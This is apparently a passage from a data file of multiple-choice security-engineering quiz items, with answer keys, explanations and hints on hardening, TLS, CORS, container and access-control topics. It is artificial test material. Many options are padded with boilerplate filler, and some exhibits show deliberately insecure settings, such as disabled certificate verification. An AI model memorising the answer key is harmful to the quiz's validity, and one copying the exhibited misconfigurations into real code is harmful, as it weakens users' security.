    correct: 2, why: "Deleting the file is the runner-up since it removes the key from view, but it remains in history and may already be copied, so rotate first.",
    hint: "Rotate first."
  },
  {
    id: 608, rank: 0, role: "security-engineering", topic: "Hardening Meaning", difficulty: "BEGINNER",
    q: "What does hardening a server involve?",
    options: ["Adding more memory and it runs faster during busy periods, as a general rule","Removing unneeded services and applying secure configuration settings","Installing every available application for staff convenience, where that is practical","Painting the cabinet that holds it in the machine room"],
    correct: 1, why: "Reducing the attack surface and tightening settings makes compromise harder.",
    hint: "Reduce attack surface."
  },
  {
    id: 609, rank: 0, role: "security-engineering", topic: "Multi-Factor Authentication", difficulty: "BEGINNER",
    q: "Which combination is an example of multi-factor authentication?",
    options: ["A username, and a password","A password plus a code from an authenticator app","A password, and a security question","Two different passwords typed one after the other"],
    correct: 1, why: "MFA combines different factor types: something known, held or being.",
    hint: "Different factor types."
  },
  {
    id: 610, rank: 0, role: "security-engineering", topic: "Firewall Default Policy", difficulty: "BEGINNER",
    q: "What is the safest default stance for a firewall's inbound rules?",
    options: ["Allow all, and block known bad traffic only","Allow traffic from the internal network without any checks","Deny all and allow only the traffic that is needed","Allow everything until someone complains"],
    correct: 2, why: "Default deny limits exposure to the services that are intentionally permitted.",
    hint: "Deny by default."
  },
  {
    id: 611, rank: 0, role: "security-engineering", topic: "Reading a Firewall Rule", difficulty: "BEGINNER",
    exhibit: "1 ALLOW any -> web-srv tcp/443\n2 ALLOW any -> db-srv tcp/3306\n3 DENY  any -> any tcp/23\n4 ALLOW lan -> dns-srv udp/53",
    q: "Which rule is the riskiest in this extract?",
    options: ["Rule 3, which blocks telnet","Rule 1, which allows the web port from the internet, as a general rule","Rule 4, which allows DNS to the resolver","Rule 2, which allows any source to reach the database port"],
    correct: 3, why: "A database should not be reachable from any source on the internet.",
    hint: "Check the destination port."
  },
  {
    id: 612, rank: 0, role: "security-engineering", topic: "Input Validation", difficulty: "BEGINNER",
    q: "Why should input be validated on the server side as well as in the browser?",
    options: ["Validation in the browser is forbidden by the standards that browsers follow","Browsers cannot display web forms unless the server has validated them first","Attackers can bypass browser checks by sending requests directly","Servers have more memory than browsers, and can store the extra rules"],
    correct: 2, why: "Client-side checks help users but are not a security control.",
    hint: "Never trust the client."
  },
  {
    id: 613, rank: 0, role: "security-engineering", topic: "Error Message Exposure", difficulty: "BEGINNER",
    q: "Why should production error pages avoid showing stack traces?",
    options: ["They make every page load more slowly for each visitor to the site","They are required to be hidden by the browser vendors in every release","They use more colours than necessary, and confuse the visitors using the site","They can reveal internal details that help an attacker"],
    correct: 3, why: "Verbose errors disclose paths, versions and queries.",
    hint: "Do not leak internals."
  },
  {
    id: 614, rank: 0, role: "security-engineering", topic: "Session Cookie Settings", difficulty: "BEGINNER",
    q: "Which cookie attributes best protect a session cookie?",
    options: ["Secure, HttpOnly and SameSite","Visible, Shared and Permanent, as a general rule","Public, Open and Unlimited, in most cases","Large, Colourful and Fast"],
    correct: 0, why: "These attributes reduce interception, script access and cross-site use.",
    hint: "Secure and HttpOnly."
  },
  {
    id: 615, rank: 0, role: "security-engineering", topic: "Logging Essentials", difficulty: "BEGINNER",
    q: "Which event is most important to log for security monitoring?",
    options: ["The names of the files on the desktop, as a general rule","The colour theme chosen by each user, as a general rule","Failed and successful sign-ins to important systems","The font used in documents"],
    correct: 2, why: "Authentication events show attacks and misuse.",
    hint: "Who signed in."
  },
  {
    id: 616, rank: 0, role: "security-engineering", topic: "Dependency Updates", difficulty: "BEGINNER",
    q: "A web application uses a library with a published critical vulnerability. What is the BEST action?",
    options: ["Remove the library name from the documentation, as a general rule","Update to the fixed version and test the application","Wait to see whether anyone attacks it","Disable the logs, then record the result in the ticket"],
    correct: 1, why: "Waiting is the runner-up as updates can break things, but a published critical flaw will be targeted, so update and test.",
    hint: "Update and test."
  },
  {
    id: 617, rank: 0, role: "security-engineering", topic: "Code Review Value", difficulty: "BEGINNER",
    q: "Why do teams perform peer code review?",
    options: ["To reduce the number of developers that the company needs to employ","To avoid the need for any testing of the software before it goes live","To increase the number of lines of code that the team produces each week","To catch defects and security flaws before release, as a general rule"],
    correct: 3, why: "A second pair of eyes finds issues the author missed.",
    hint: "Second pair of eyes."
  },
  {
    id: 618, rank: 0, role: "security-engineering", topic: "Network Segmentation", difficulty: "BEGINNER",
    q: "What is the main security benefit of segmenting a network?",
    options: ["It prevents all phishing emails from reaching the staff in the company","It limits how far an attacker can move after a compromise","It makes the network faster in every case, whatever traffic is carried","It removes the need for passwords on the systems inside each segment"],
    correct: 1, why: "Segments contain breaches and restrict unnecessary access.",
    hint: "Contain movement."
  },
  {
    id: 619, rank: 0, role: "security-engineering", topic: "Backup Principle", difficulty: "BEGINNER",
    q: "Which backup practice best protects against ransomware?",
    options: ["Backing up once a year, and review the outcome at the next monthly meeting","Keeping offline or immutable copies and testing restores","Keeping one copy on the same server","Keeping backups on a mapped network drive"],
    correct: 1, why: "Attackers encrypt reachable backups, so isolated copies and tested recovery are essential.",
    hint: "Offline and tested."
  },
  {
    id: 620, rank: 0, role: "security-engineering", topic: "Email Authentication", difficulty: "BEGINNER",
    exhibit: "example.com TXT \"v=spf1 include:_spf.mail.example ~all\"\n_dmarc.example.com TXT \"v=DMARC1; p=none; rua=mailto:dmarc@example.com\"",
    q: "Which records help receivers check that email really came from your domain?",
    options: ["TXT, and CNAME for web pages","MX, NS and SOA","A, AAAA and PTR","SPF, DKIM and DMARC"],
    correct: 3, why: "Together they authenticate senders and tell receivers what to do with failures.",
    hint: "Three letters, one policy."
  },
  {
    id: 621, rank: 0, role: "security-engineering", topic: "Default Accounts", difficulty: "BEGINNER",
    q: "What should be done with default administrator accounts on new devices?",
    options: ["Leave them as supplied, and review the outcome at the next monthly meeting","Write them on the device, and revisit the decision after the next release","Share them with the team","Change or disable the default credentials before use"],
    correct: 3, why: "Defaults are published and tried first by attackers.",
    hint: "Change defaults."
  },
  {
    id: 622, rank: 0, role: "security-engineering", topic: "Antivirus and EDR", difficulty: "BEGINNER",
    q: "What advantage does endpoint detection and response have over basic antivirus?",
    options: ["It records behaviour and helps investigate and respond","It replaces all patching, and the updates are no longer needed at all","It makes the computer run faster by removing unused programs during the night","It only scans the incoming emails for attachments that contain known viruses"],
    correct: 0, why: "EDR gives visibility into process activity and allows containment.",
    hint: "Behaviour and response."
  },
  {
    id: 623, rank: 0, role: "security-engineering", topic: "VPN Purpose", difficulty: "BEGINNER",
    q: "What does a VPN provide for remote workers?",
    options: ["An encrypted tunnel to the company network","Free software licences for the applications used by the remote workers","A faster home internet connection when the staff are working from home","A larger display for the remote workers who use a small laptop screen"],
    correct: 0, why: "VPNs protect traffic over untrusted networks and control access.",
    hint: "Encrypted tunnel."
  },
  {
    id: 624, rank: 0, role: "security-engineering", topic: "DMZ Concept", difficulty: "BEGINNER",
    q: "What is a DMZ in network design?",
    options: ["A shared folder that holds the old files that are no longer needed","A separate zone for public-facing servers, as a general rule","A backup site that is located in another city to protect against disasters","A zone in which nobody is allowed to log in under any circumstances"],
    correct: 1, why: "A DMZ limits exposure of internal systems if a public server is compromised.",
    hint: "Between the two."
  },
  {
    id: 625, rank: 0, role: "security-engineering", topic: "Secure Deletion", difficulty: "BEGINNER",
    q: "Why is simply deleting a file not enough before disposing of a disk?",
    options: ["Data may remain recoverable, so wipe or destroy the disk","The deleted file will reappear on another computer in the network automatically","Deleting a file makes the disk heavier, and slower when it is returned","Deleting files from disks that are being disposed of is not allowed by law"],
    correct: 0, why: "Standard deletion removes pointers, not the data itself.",
    hint: "Wipe or destroy."
  },
  {
    id: 626, rank: 0, role: "security-engineering", topic: "Certificate Expiry", difficulty: "BEGINNER",
    q: "What is a typical result of an expired TLS certificate?",
    options: ["All of the user passwords are reset when the certificate passes its end date","The server becomes faster as it no longer checks the certificate chain","The whole network is disconnected until the supplier has renewed the licence","Browsers show warnings, and some clients refuse to connect, in most cases"],
    correct: 3, why: "Expired certificates break trust and often cause outages.",
    hint: "Warnings and failures."
  },
  {
    id: 627, rank: 0, role: "security-engineering", topic: "Rate Limiting", difficulty: "BEGINNER",
    q: "What does rate limiting on a login endpoint help prevent?",
    options: ["The upload of large images by users who edit their profile pictures","Slow page loading when the site is busy during the lunch hour","Rapid automated password guessing","The delivery of email messages from the application to the customers"],
    correct: 2, why: "Limits on attempts slow brute force and credential stuffing.",
    hint: "Slow the guessing."
  },
  {
    id: 628, rank: 0, role: "security-engineering", topic: "Single Sign-On Benefit", difficulty: "BEGINNER",
    q: "Which is a security benefit of single sign-on?",
    options: ["Central control of authentication and access removal","It removes the need for logging","Everyone shares one password","Passwords are never needed"],
    correct: 0, why: "SSO simplifies enforcement of MFA and offboarding.",
    hint: "Central control."
  },
  {
    id: 629, rank: 0, role: "security-engineering", topic: "Container Basics", difficulty: "BEGINNER",
    q: "What is a sensible security practice for container images?",
    options: ["Run all containers as root, and review the outcome at the next monthly meeting","Store secrets in the image","Use minimal trusted base images, and scan them for vulnerabilities","Download images from any public source without checks, in most cases"],
    correct: 2, why: "Smaller trusted images reduce the attack surface and known flaws.",
    hint: "Minimal and scanned."
  },
  {
    id: 630, rank: 0, role: "security-engineering", topic: "Clock Accuracy on Servers", difficulty: "BEGINNER",
    q: "Why is accurate time important on servers?",
    options: ["It saves storage","It stops viruses","Logs and certificates depend on correct time","It makes screens brighter"],
    correct: 2, why: "Event correlation and token validity rely on synchronised clocks.",
    hint: "Logs and tokens."
  },
  {
    id: 631, rank: 0, role: "security-engineering", topic: "Change Control Value", difficulty: "BEGINNER",
    q: "Why use change control for production systems?",
    options: ["To avoid testing","To make changes slower for no reason","To review and record changes so that problems can be traced and reversed","To hide changes"],
    correct: 2, why: "Controlled change reduces outages and unauthorised modifications.",
    hint: "Review and trace."
  },
  {
    id: 632, rank: 0, role: "security-engineering", topic: "CSRF Concept", difficulty: "BEGINNER",
    q: "What does a cross-site request forgery attack do?",
    options: ["Changes the DNS","Floods the network","Steals the server's disk","Makes a victim's browser send an unwanted request to a site where they are logged in"],
    correct: 3, why: "The browser attaches the victim's cookies to a request the attacker triggers.",
    hint: "Browser sends it."
  },
  {
    id: 633, rank: 0, role: "security-engineering", topic: "Physical Security Link", difficulty: "BEGINNER",
    q: "Why does physical security matter to system security?",
    options: ["It has no effect on computers","It replaces firewalls","Someone with physical access can bypass many technical controls","It only matters for paper"],
    correct: 2, why: "Locked rooms and controlled access protect devices and ports.",
    hint: "Physical access bypasses controls."
  },
  {
    id: 634, rank: 0, role: "security-engineering", topic: "Vulnerability Scanning", difficulty: "BEGINNER",
    q: "What does a vulnerability scanner do?",
    options: ["Blocks all attacks automatically","Checks systems for known weaknesses and missing patches","Writes code","Repairs hardware"],
    correct: 1, why: "Scanners identify issues so they can be prioritised and fixed.",
    hint: "Finds known flaws."
  },
  {
    id: 635, rank: 0, role: "security-engineering", topic: "Encryption at Rest", difficulty: "BEGINNER",
    q: "What does encryption at rest protect against?",
    options: ["Slow websites","Phishing emails","Network eavesdropping","Exposure of data if storage media is stolen or accessed without authorisation"],
    correct: 3, why: "Stored data stays unreadable without the key.",
    hint: "Stored data."
  },
  {
    id: 636, rank: 0, role: "security-engineering", topic: "Software Inventory", difficulty: "BEGINNER",
    q: "Why should an organisation keep an inventory of software and versions?",
    options: ["To count staff","To pick desk colours","To avoid licences","To know what needs patching when vulnerabilities are announced"],
    correct: 3, why: "You cannot fix what you cannot find.",
    hint: "Know what you run."
  },
  {
    id: 637, rank: 0, role: "security-engineering", topic: "Allowlisting Idea", difficulty: "BEGINNER",
    q: "What is application allowlisting?",
    options: ["Permitting only approved programs to run, wherever possible","Allowing all downloads, and review the outcome at the next monthly meeting","Blocking only known viruses","Listing staff names, and revisit the decision after the next release"],
    correct: 0, why: "Allowlisting blocks unknown or unapproved software by default.",
    hint: "Approved only."
  },
  {
    id: 638, rank: 0, role: "security-engineering", topic: "Web Application Firewall", difficulty: "BEGINNER",
    q: "A company wants quick protection for a vulnerable legacy website while developers prepare a fix. What is the BEST short-term control?",
    options: ["Place a web application firewall in front with rules for the known flaw, as a general rule","Rename the site","Turn off logging","Ignore it until the fix is ready"],
    correct: 0, why: "Ignoring it is the runner-up as the fix is coming, but the site stays exposed; a WAF gives temporary protection.",
    hint: "Virtual patch."
  },
  {
    id: 639, rank: 0, role: "security-engineering", topic: "Secure Defaults", difficulty: "BEGINNER",
    q: "What does 'secure by default' mean for a product?",
    options: ["The default settings are the safest practical configuration","Users must turn on all security manually","Security is optional","Only experts can use it"],
    correct: 0, why: "Safe defaults protect users who never change settings.",
    hint: "Safe out of the box."
  },
  {
    id: 640, rank: 0, role: "security-engineering", topic: "Principle of Defence in Depth", difficulty: "BEGINNER",
    q: "What does defence in depth mean?",
    options: ["Buying all security products from a single supplier","Hiding the systems and nobody can find them","Using several layers of controls so one failure does not expose everything","Relying on one very strong firewall at the edge of the network, until the next scheduled review takes place"],
    correct: 2, why: "Layered controls give several chances to stop or detect an attack.",
    hint: "Many layers."
  },
  {
    id: 641, rank: 1, role: "security-engineering", topic: "Reading Security Headers", difficulty: "INTERMEDIATE",
    exhibit: "HTTP/1.1 200 OK\nContent-Type: text/html\nStrict-Transport-Security: max-age=31536000\nX-Content-Type-Options: nosniff\nSet-Cookie: sid=abc; Secure; HttpOnly",
    q: "Which missing response header in this output leaves the page most exposed to injected scripts?",
    options: ["Date, which tells the client the time at which the response was created","Content-Security-Policy","Content-Length, which tells the client how many bytes the body contains","Server timing, which exposes how long each backend step took to run"],
    correct: 1, why: "A content security policy restricts where scripts may load from and limits the impact of XSS.",
    hint: "The header that limits scripts."
  },
  {
    id: 642, rank: 1, role: "security-engineering", topic: "OAuth Flow Choice", difficulty: "INTERMEDIATE",
    q: "A single-page application needs to sign users in with an identity provider. What is the BEST OAuth flow?",
    options: ["Client credentials flow using one shared secret in the page","Resource owner password flow with the user's password in the app","Implicit flow that returns the token in the browser address","Authorization code flow with PKCE, as a general rule"],
    correct: 3, why: "The implicit flow is the runner-up since older guides recommended it, but tokens in URLs leak; code with PKCE is the current recommendation.",
    hint: "Code plus PKCE."
  },
  {
    id: 643, rank: 1, role: "security-engineering", topic: "CORS Misconfiguration", difficulty: "INTERMEDIATE",
    exhibit: "Access-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true",
    q: "Which CORS response is most dangerous for an API that uses cookies?",
    options: ["Allow-Origin reflecting any origin, with credentials allowed","Allow-Origin set to one trusted partner site that the company controls, and monitors","A Max-Age of 600 seconds, and browsers cache the preflight result briefly","No CORS headers at all, and browsers apply the default same-origin policy"],
    correct: 0, why: "Reflecting arbitrary origins with credentials lets any site read authenticated responses.",
    hint: "Reflect plus credentials."
  },
  {
    id: 644, rank: 1, role: "security-engineering", topic: "SAST Versus DAST", difficulty: "INTERMEDIATE",
    q: "How does static analysis (SAST) differ from dynamic testing (DAST)?",
    options: ["SAST tests networks for open ports, while DAST tests the strength of passwords","They are identical in method and results, and differ only in the vendor name","SAST needs a running server to work, while DAST reads the source code only, as a general rule","SAST reads code without running it, DAST tests the running app, in most cases"],
    correct: 3, why: "SAST finds code issues early; DAST finds runtime and configuration issues from the outside.",
    hint: "Code versus running app."
  },
  {
    id: 645, rank: 1, role: "security-engineering", topic: "Branch Protection", difficulty: "INTERMEDIATE",
    q: "Which repository setting best reduces the risk of unreviewed code reaching production?",
    options: ["Branch protection requiring reviews and passing checks before merge","Allowing every developer to push directly to main, and review the outcome at the next monthly meeting","Disabling the build server","Storing the keys in the repository, until the next scheduled review takes place"],
    correct: 0, why: "Required reviews and checks enforce the process technically.",
    hint: "Enforce the review."
  },
  {
    id: 646, rank: 1, role: "security-engineering", topic: "Secrets Scanning in CI", difficulty: "INTERMEDIATE",
    q: "A pipeline should stop leaked credentials reaching the repository. What is the BEST control?",
    options: ["A wiki page that lists the rules about secrets, and who to ask for help","A scan of the whole repository carried out once a year before the audit","Pre-commit and pipeline scanning that blocks, with rotation of findings","A monthly email asking every developer to check their own code for secrets"],
    correct: 2, why: "A reminder email is the runner-up since it raises awareness, but only automated blocking stops the mistake.",
    hint: "Automate and block."
  },
  {
    id: 647, rank: 1, role: "security-engineering", topic: "Reading sshd_config", difficulty: "INTERMEDIATE",
    exhibit: "Port 22\nPermitRootLogin yes\nPasswordAuthentication no\nX11Forwarding no\nUsePAM yes",
    q: "Which setting in this sshd configuration is the biggest hardening problem?",
    options: ["PermitRootLogin yes","X11Forwarding no, as a general rule","Port 22","UsePAM yes, as a general rule"],
    correct: 0, why: "Direct root login over SSH removes accountability and exposes the most powerful account to guessing.",
    hint: "Root over SSH."
  },
  {
    id: 648, rank: 1, role: "security-engineering", topic: "Kubernetes RBAC", difficulty: "INTERMEDIATE",
    exhibit: "kind: ClusterRoleBinding\nsubjects:\n- kind: ServiceAccount\n  name: web-app\n  namespace: prod\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin",
    q: "A pod uses a service account bound to cluster-admin. What is the finding?",
    options: ["A normal default that needs no change as the platform team set it up","A storage limit that stops the pod from writing more than a few gigabytes","A performance setting that lets the scheduler place pods on busy nodes","Excessive privilege that lets a compromised pod control the cluster"],
    correct: 3, why: "Pods should have narrowly scoped roles; cluster-admin turns any compromise into full control.",
    hint: "Over-privileged."
  },
  {
    id: 649, rank: 1, role: "security-engineering", topic: "Infrastructure as Code Scanning", difficulty: "INTERMEDIATE",
    q: "What is the main benefit of scanning Terraform templates before deployment?",
    options: ["Fewer cloud accounts are needed","The scanner replaces peer review, and no human needs to read the changes","The templates run faster","Misconfigurations such as public storage are caught before production"],
    correct: 3, why: "Shift-left checks prevent insecure resources from being created.",
    hint: "Before deployment."
  },
  {
    id: 650, rank: 1, role: "security-engineering", topic: "Threat Modelling STRIDE", difficulty: "INTERMEDIATE",
    q: "In STRIDE, which category covers an attacker pretending to be another user?",
    options: ["Tampering","Repudiation","Elevation of privilege","Spoofing"],
    correct: 3, why: "Spoofing is falsely claiming an identity; the matching control is authentication.",
    hint: "S is for spoofing."
  },
  {
    id: 651, rank: 1, role: "security-engineering", topic: "Vulnerability Prioritisation", difficulty: "INTERMEDIATE",
    q: "Scanners report 3,000 findings. What is the BEST way to prioritise remediation?",
    options: ["Fix only the ones that are easiest","Combine exploitability, exposure and asset criticality, such as with KEV","Fix only those with the highest CVSS score, and ignore everything below it","Fix them in the order the scanner lists them"],
    correct: 1, why: "Using CVSS alone is the runner-up since it is standard, but it ignores exploitation and exposure.",
    hint: "Risk, not score alone."
  },
  {
    id: 652, rank: 1, role: "security-engineering", topic: "Key Rotation", difficulty: "INTERMEDIATE",
    q: "Why should encryption keys and API secrets be rotated regularly?",
    options: ["It limits the time a stolen key remains useful","It makes the key longer each time it is replaced by the key management service","It speeds up encryption as newer keys use more efficient processor instructions","It is needed for backups only, and has no effect on any other system"],
    correct: 0, why: "Rotation shortens exposure and tests the ability to replace keys.",
    hint: "Limit exposure time."
  },
  {
    id: 653, rank: 1, role: "security-engineering", topic: "Mutual TLS", difficulty: "INTERMEDIATE",
    q: "What does mutual TLS add to a normal TLS connection between services?",
    options: ["A second password that the service must send after the handshake completes","Compression of the data that is sent between the two services on the network","The client also presents a certificate so both sides authenticate","A faster handshake that skips the checking of the server certificate chain"],
    correct: 2, why: "Both parties prove identity with certificates, which suits service-to-service traffic.",
    hint: "Both authenticate."
  },
  {
    id: 654, rank: 1, role: "security-engineering", topic: "Docker Hardening", difficulty: "INTERMEDIATE",
    exhibit: "FROM alpine:3.19\nCOPY app /app\nEXPOSE 8080\nUSER root\nCMD [\"/app\"]",
    q: "Which Dockerfile line is the most concerning from a security view?",
    options: ["FROM a pinned minimal base image, which keeps the image small and predictable","COPY of the compiled binary into the image from the build stage","USER root with the application running as root, in most cases","EXPOSE of the single port that the application needs in order to serve requests"],
    correct: 2, why: "Running as root increases the impact of a container escape or application flaw.",
    hint: "Run as non-root."
  },
  {
    id: 655, rank: 1, role: "security-engineering", topic: "Backup Design", difficulty: "INTERMEDIATE",
    q: "Which design best follows the 3-2-1 backup rule?",
    options: ["Three copies on two media types, with one copy offsite","Three copies on the same disk in the same machine in the same rack","One copy on the main server","Two copies in the same rack"],
    correct: 0, why: "Diversity of media and location protects against several failure types.",
    hint: "Three, two, one."
  },
  {
    id: 656, rank: 1, role: "security-engineering", topic: "DMARC Rollout", difficulty: "INTERMEDIATE",
    q: "A company wants to stop spoofing of its domain without losing legitimate email. What is the BEST DMARC approach?",
    options: ["Monitor with p=none, fix senders, then quarantine and reject","Leave DMARC off","Set p=reject on day one","Add p=none permanently, and never move to any stricter policy afterwards"],
    correct: 0, why: "Going straight to reject is the runner-up since it blocks spoofing, but it can block legitimate mail from unknown senders.",
    hint: "Monitor, then enforce."
  },
  {
    id: 657, rank: 1, role: "security-engineering", topic: "802.1X Purpose", difficulty: "INTERMEDIATE",
    q: "What does 802.1X provide on a wired or wireless network?",
    options: ["Faster file transfers between the users, and the file servers on the same floor","Port-based authentication before a device gets network access","Spam filtering for the incoming mail before it reaches each user's mailbox","Disk encryption for every laptop that connects to the corporate wireless network"],
    correct: 1, why: "Devices authenticate to the network before being allowed on it.",
    hint: "Authenticate to connect."
  },
  {
    id: 658, rank: 1, role: "security-engineering", topic: "Session Fixation", difficulty: "INTERMEDIATE",
    q: "Which defence best prevents session fixation after login?",
    options: ["Increase the font size","Issue a new session identifier when authentication succeeds","Use short usernames, until the next scheduled review takes place","Hide the login page, and revisit the decision after the next release"],
    correct: 1, why: "Regenerating the session ID stops an attacker reusing a pre-login ID.",
    hint: "Regenerate on login."
  },
  {
    id: 659, rank: 1, role: "security-engineering", topic: "API Authorisation", difficulty: "INTERMEDIATE",
    q: "An API checks that a token is valid but not that the user may access the requested record. What is the weakness?",
    options: ["Weak encryption of the token while it is carried between the client, and server","Wrong colours in the interface that is used by the support staff to view data","Slow queries in the database when many users request their records together","Missing object-level authorisation, wherever possible"],
    correct: 3, why: "Authentication is not authorisation; every object access needs a permission check.",
    hint: "Check ownership."
  },
  {
    id: 660, rank: 1, role: "security-engineering", topic: "TLS Configuration Review", difficulty: "INTERMEDIATE",
    exhibit: "Protocols: TLSv1.0 TLSv1.1 TLSv1.2\nCiphers: ECDHE-RSA-AES128-GCM-SHA256 RC4-SHA DES-CBC3-SHA",
    q: "Which TLS configuration should be flagged as outdated?",
    options: ["HSTS with a one-year max-age, as a general rule","TLS 1.0 and RC4 cipher suites enabled","TLS 1.3 only","TLS 1.2 with ECDHE, and AES-GCM"],
    correct: 1, why: "Old protocols and weak ciphers are vulnerable and should be disabled.",
    hint: "Old protocols."
  },
  {
    id: 661, rank: 1, role: "security-engineering", topic: "SBOM Use", difficulty: "INTERMEDIATE",
    q: "How does a software bill of materials help engineering teams?",
    options: ["It lists components so that new flaws can be checked quickly","It replaces testing","It reduces the build time by caching the packages that the compiler downloads","It encrypts the build"],
    correct: 0, why: "An inventory of dependencies makes impact assessment fast.",
    hint: "Know your parts."
  },
  {
    id: 662, rank: 1, role: "security-engineering", topic: "WAF Tuning", difficulty: "INTERMEDIATE",
    q: "A WAF in blocking mode keeps stopping legitimate customer requests. What is the best action?",
    options: ["Delete the logs","Switch the WAF off","Analyse the rule matches and tune narrowly, keeping protection","Allow all traffic from customers, and the WAF no longer blocks anything"],
    correct: 2, why: "Targeted tuning removes false positives without losing coverage.",
    hint: "Tune narrowly."
  },
  {
    id: 663, rank: 1, role: "security-engineering", topic: "Zone Design", difficulty: "INTERMEDIATE",
    q: "Where should a database that is used only by an application server be placed?",
    options: ["On the guest Wi-Fi","Directly on the internet","In a back-end zone reachable only from the application tier","In the DMZ with the web server"],
    correct: 2, why: "Tiered zones keep data stores away from direct exposure.",
    hint: "Back end."
  },
  {
    id: 664, rank: 1, role: "security-engineering", topic: "Patch SLA", difficulty: "INTERMEDIATE",
    q: "What should a patching policy define for critical vulnerabilities?",
    options: ["A short fixed deadline with an exception process, in most cases","Patching whenever someone in the team happens to remember to do it","No deadline","Only annual patching"],
    correct: 0, why: "Clear service levels create accountability and measurability.",
    hint: "Deadlines."
  },
  {
    id: 665, rank: 1, role: "security-engineering", topic: "Certificate Chain", difficulty: "INTERMEDIATE",
    q: "A client rejects a server certificate because the chain is incomplete. What is the likely cause?",
    options: ["The server does not send the intermediate certificate","The server's disk is full","The browser has too many tabs","The password is too long"],
    correct: 0, why: "Clients need the intermediate certificates to link the server certificate to a trusted root.",
    hint: "Missing intermediate."
  },
  {
    id: 666, rank: 1, role: "security-engineering", topic: "Split Tunnelling Risk", difficulty: "INTERMEDIATE",
    q: "A VPN uses split tunnelling so that only company traffic goes through the tunnel. What is the BEST view?",
    options: ["Irrelevant","Acceptable with endpoint protection and DNS controls if the risk is assessed","Always forbidden","Always required"],
    correct: 1, why: "Always forbidden is the runner-up because it is simple, but it may harm performance; risk-based controls can allow it safely.",
    hint: "Assess it."
  },
  {
    id: 667, rank: 1, role: "security-engineering", topic: "Hardware Security Module", difficulty: "INTERMEDIATE",
    q: "What is the main purpose of an HSM?",
    options: ["Speeding up the network, and review the outcome at the next monthly meeting","Printing certificates","Protecting cryptographic keys inside tamper-resistant hardware","Storing user documents"],
    correct: 2, why: "Keys never leave the device in plain form.",
    hint: "Keys in hardware."
  },
  {
    id: 668, rank: 1, role: "security-engineering", topic: "Logging Configuration", difficulty: "INTERMEDIATE",
    q: "Which logging setting best supports investigation of an application breach?",
    options: ["Logs without timestamps","Central, tamper-resistant logs with user, time and source for key actions, in most cases","Local logs overwritten daily","Logs that include passwords"],
    correct: 1, why: "Reliable and centralised logs support reconstruction of events.",
    hint: "Central and complete."
  },
  {
    id: 669, rank: 1, role: "security-engineering", topic: "Least Functionality", difficulty: "INTERMEDIATE",
    q: "What does disabling unused services on a server achieve?",
    options: ["It changes the IP address","It increases the disk size","It reduces the attack surface","It speeds up the monitor"],
    correct: 2, why: "Fewer running services means fewer vulnerabilities to exploit.",
    hint: "Smaller surface."
  },
  {
    id: 670, rank: 1, role: "security-engineering", topic: "Code Signing", difficulty: "INTERMEDIATE",
    q: "Why sign software releases?",
    options: ["So updates are free","So users and systems can verify who published it and that it was not altered","So it runs without testing","So the file is smaller"],
    correct: 1, why: "Signatures support integrity and provenance checks.",
    hint: "Verify origin."
  },
  {
    id: 671, rank: 1, role: "security-engineering", topic: "Denial of Service Mitigation", difficulty: "INTERMEDIATE",
    q: "Which design choice best helps an internet-facing service survive a volumetric attack?",
    options: ["Removing monitoring, and review the outcome at the next monthly meeting","Using one large server","Disabling logging, and revisit the decision after the next release","Using a CDN or scrubbing service with rate limits"],
    correct: 3, why: "Absorbing and filtering traffic upstream protects capacity.",
    hint: "Absorb upstream."
  },
  {
    id: 672, rank: 1, role: "security-engineering", topic: "Secure Design Review", difficulty: "INTERMEDIATE",
    q: "When is the best time for a security design review of a new system?",
    options: ["Only after an incident","Never","After launch","During design, before major implementation begins, as soon as practical"],
    correct: 3, why: "Fixing design flaws early is far cheaper than later.",
    hint: "Early."
  },
  {
    id: 673, rank: 1, role: "security-engineering", topic: "MFA for Admins", difficulty: "INTERMEDIATE",
    q: "Which approach best protects administrator accounts?",
    options: ["Writing the password down, and review the outcome at the next monthly meeting","Sharing the account, then record the result in the ticket","Phishing-resistant MFA and separate admin accounts","A longer password only"],
    correct: 2, why: "Privileged accounts need stronger and isolated authentication.",
    hint: "Strong and separate."
  },
  {
    id: 674, rank: 1, role: "security-engineering", topic: "Dependency Confusion", difficulty: "INTERMEDIATE",
    q: "Developers find that an internal package name also exists on a public registry. What is the BEST mitigation?",
    options: ["Use the highest version number, and review the outcome at the next monthly meeting","Delete the public package","Tell developers to be careful, and review the outcome at the next monthly meeting","Use scoped names or a private registry priority with version pinning and checks"],
    correct: 3, why: "Telling developers is the runner-up since it costs nothing, but it cannot stop a build from pulling the wrong package.",
    hint: "Fix the resolver."
  },
  {
    id: 675, rank: 1, role: "security-engineering", topic: "Data Masking in Test", difficulty: "INTERMEDIATE",
    q: "How should production data be handled in non-production environments?",
    options: ["Copy it unchanged, until the next scheduled review takes place","Email it to testers","Keep it on laptops, then record the result in the ticket","Mask or synthesise sensitive fields before use"],
    correct: 3, why: "Test systems have weaker controls and should not hold real personal data.",
    hint: "Mask it."
  },
  {
    id: 676, rank: 1, role: "security-engineering", topic: "Email Gateway Controls", difficulty: "INTERMEDIATE",
    q: "Which control best reduces the chance of malicious attachments reaching users?",
    options: ["Telling users to be careful","Gateway scanning and sandboxing with blocking of risky file types","Using longer subject lines, until the next scheduled review takes place","Disabling email, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Automated filtering reduces exposure before users decide.",
    hint: "Filter first."
  },
  {
    id: 677, rank: 1, role: "security-engineering", topic: "Hostname Verification", difficulty: "INTERMEDIATE",
    exhibit: "context = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE",
    q: "An application connects over TLS but does not verify the server's hostname. What is the risk?",
    options: ["Larger packets","Slower connections","A man-in-the-middle could present any valid certificate","No risk"],
    correct: 2, why: "Without hostname verification the certificate need not belong to the intended server.",
    hint: "Verify the name."
  },
  {
    id: 678, rank: 1, role: "security-engineering", topic: "Privileged Session Recording", difficulty: "INTERMEDIATE",
    q: "Why record privileged administrator sessions on critical servers?",
    options: ["To provide accountability and evidence if privileged access is misused","To reduce the disk space used by logs","To slow down administrators on purpose","To replace passwords entirely"],
    correct: 0, why: "Recordings support investigation, deterrence and review of high-risk activity.",
    hint: "Accountability."
  },
  {
    id: 679, rank: 1, role: "security-engineering", topic: "Container Registry Control", difficulty: "INTERMEDIATE",
    q: "Which control best ensures only trusted images run in production?",
    options: ["Disabling image scanning","Allowing developers to run any image, and revisit the decision after the next release","Signed images from a private registry with admission policy checks","Pulling the latest tag from any public registry, until the next scheduled review takes place"],
